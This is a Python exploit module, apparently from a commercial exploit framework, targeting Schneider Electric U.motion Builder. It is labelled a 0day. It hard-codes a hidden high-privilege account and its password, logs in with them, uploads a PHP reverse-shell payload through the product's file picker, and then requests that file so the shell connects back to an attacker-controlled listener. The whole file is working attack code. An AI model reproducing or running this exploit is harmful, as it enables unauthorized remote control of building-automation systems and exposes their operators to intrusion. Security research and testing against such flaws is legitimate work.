#!/usr/bin/env python

import urllib2
import re
import json
import cookielib
from collections import OrderedDict

from Sploit import Sploit
from core.WebHelper import FormPoster
from shellcodes.Shellcodes import CrossOSShellcodes

INFO = {}
INFO['NAME'] = "efs_u_motion_builder_hardcoded_credentials"
INFO['DESCRIPTION'] = "Schneider Electric U.motion Builder Hardcoded High-privilege Credentials"
INFO['VENDOR'] = "http://www.schneider-electric.com"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    The specific flaw exists within the configuration of the product. The web service comes with a hidden\
     system account with a hard-coded password. An attacker can use this vulnerability to log into the system with high-privilege credentials.
Tested against U.motion Builder 1.2.1 on Windows 7 SP1 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://www.schneider-electric.com/en/download/document/SE_UMOTION_BUILDER/"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "30 Jun, 2017. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.9"
OPTIONS["PORT"] = 8080
OPTIONS["CONNECTBACK_IP"] = '192.168.1.9'


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.username = 'system'
        self.password = 'qpnvmu!!'
        self.cb_ip = self.args.get("CONNECTBACK_IP", OPTIONS["CONNECTBACK_IP"])
        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log("[-] Please enable listener to recieve connect back from shell")
            self.finish(False)

    def make_url(self, path=''):
        url = "http://%s:%s/%s" % (self.host, self.port, path)
        return url

    def generate_payload(self):
        s = CrossOSShellcodes(self.cb_ip, self.listener_port)
        shell = s.create_shellcode('php')
        return shell

    def check(self):
        url = self.make_url()
        self.log('[*] Checking %s' % url)
        try:
            urllib2.urlopen(url)
        except:
            self.log('[-] Can\'t connect to %s' % url)
            self.finish(True)

    def login(self):
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        login_url = self.make_url('/umotion/modules/system/user_login.php')
        data = 'username={}&password={}&rememberMe=1&context=configuration&op=login'.format(self.username,
                                                                                            self.password)
        res = opener.open(login_url, data).read()
        if '<userID>' not in res:
            message = re.search('<message>(.*)</message>', res).group(1)
            self.log('[-] {}'.format(message))
            self.finish(False)
        self.log('[+] User {} successfully logged in'.format(self.username))
        self.opener = opener


    def run(self):
        # Get options from gui
        self.args()
        self.check()
        self.login()
        payload_name = 'test.php'
        content = self.generate_payload()
        form = FormPoster()
        form.add_field('upload_path_to', '/mnt/storage/RWdlabs/smartdomuspad/modules/supervision/images/background/')
        form.add_field('upload', '1')
        form.add_field('upload_local', '0')
        form.add_field('upload_local_file', '0')
        form.add_field('upload_local_path_from', '0')
        form.add_field('delete', '0')
        form.add_field('delete_file_name', '')
        form.add_file('upload_file', payload_name, content, False)
        url = self.make_url('umotion/modules/system/file_picker.php')
        req = form.post(url)
        res = self.opener.open(req).read()
        res = json.loads(res)
        if not res['size']:
            self.log('[-] File not uploaded')
            self.finish(False)
        self.log('[+] Payload successfully uploaded')
        url = self.make_url('umotion/modules/supervision/images/background/' + payload_name)
        self.opener.open(url)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()